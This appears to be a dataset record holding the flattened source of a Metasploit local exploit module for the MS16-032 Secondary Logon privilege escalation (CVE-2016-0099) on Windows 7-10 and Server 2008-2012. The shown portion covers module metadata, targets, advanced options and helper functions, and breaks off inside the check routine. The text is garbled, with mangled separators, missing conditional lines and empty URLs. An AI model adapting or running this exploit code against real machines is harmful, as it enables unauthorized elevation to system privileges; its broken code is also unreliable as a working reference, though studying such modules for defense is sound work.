{
    "text": "vul_name : MS16-032 Secondary Logon Handle Privilege Escalation ， vul_cve : CVE-2016-0099 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， require 'msf/core/payload_generator' ， require 'msf/core/exploit/powershell' ， require 'rex' ， class MetasploitModule < Msf : Exploit : Local ， Rank = NormalRanking ， include Msf : Exploit : Powershell ， include Msf : Post : Windows : Priv ， include Msf : Post : Windows : Process ， include Msf : Post : File ， include Msf : Post : Windows : ReflectiveDLLInjection ， super ( update_info ( info ,  ， 'Name' => 'MS16-032 Secondary Logon Handle Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits the lack of sanitization of standard handles in Windows' Secondary ， Logon Service. The vulnerability is known to affect versions of Windows 7-10 and 2k8-2k12 ， 32 and 64 bit. This module will only work against those versions of Windows with ， Powershell 2.0 or later and systems with two or more CPU cores. ， } ,  ， 'License' => BSD_LICENSE ,  ， 'Author' => ，  [  ， 'James Forshaw' ,  # twitter.com/tiraniddo ， 'b33f' ,  #  @ FuzzySec ,  ， 'khr0x40sh' ，  ]  ,  ， ' ，  [  ，  [ 'MS' , 'MS16-032' ]  ,  ，  [ 'CVE' , '2016-0099' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'DefaultOptions' => ， { ， 'WfsDelay' => 30 ,  ， 'EXITFUNC' => 'thread' ， } ,  ， 'DisclosureDate' => 'Mar 21 2016' ,  ， 'Platform' => [ 'win' ]  ,  ， 'SessionTypes' => [ 'meterpreter' ]  ,  ， 'Targets' => ，  [  ，  # Tested on ( 32 bits )  :  ，  #  * Windows 7 SP1 ，  [ 'Windows x86' , { 'Arch' => ARCH_X86 } ]  ,  ，  # Tested on ( 64 bits )  :  ，  #  * Windows 7 SP1 ，  #  * Windows 8 ，  #  * Windows 2012 ，  [ 'Windows x64' , { 'Arch' => ARCH_X86_64 } ]  ，  ]  ,  ， 'DefaultTarget' => 0 ， register_advanced_options (  ，  [  ， OptString.new ( 'W_PATH' ,  [ false , 'Where to write temporary powershell file' , nil ]  )  ,  ， OptBool.new ( 'DRY_RUN' ,  [ false , 'Only show what would be done' , false ]  )  ,  ，  # How long until we DELETE file , we have a race condition here , so anything less than 60 ，  # seconds might break ， OptInt.new ( 'TIMEOUT' ,  [ false , 'Execution timeout' , 60 ]  )  ，  ]  , self.class )  ， end ， def get_arch ， arch = nil ， arch = ARCH_X86_64 ， elsif sysinfo [ \"Architecture\" ] = ~ /x86/i ， arch = ARCH_X86 ， end ， arch ， end ， def check ， os = sysinfo [ \"OS\" ]  ，  # Non-Windows systems are definitely not affected.",
    "time": "2016.07.13"
}